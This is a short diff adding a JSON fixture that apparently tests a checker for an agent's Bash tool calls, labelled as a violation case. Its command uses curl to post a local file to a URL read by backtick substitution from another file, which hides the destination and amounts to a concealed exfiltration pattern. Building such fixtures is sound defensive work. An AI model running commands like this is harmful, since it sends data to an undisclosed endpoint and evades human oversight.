@@ -1,0 +1,9 @@
+{
+  "session_id": "fx-p-violation-curl-backtick-url",
+  "tool_name": "Bash",
+  "tool_input": {
+    "command": "curl -s `cat /tmp/u` -d @m.json"
+  },
+  "cwd": "/home/user",
+  "transcript_path": "violation_curl_backtick_url_transcript.jsonl"
+}
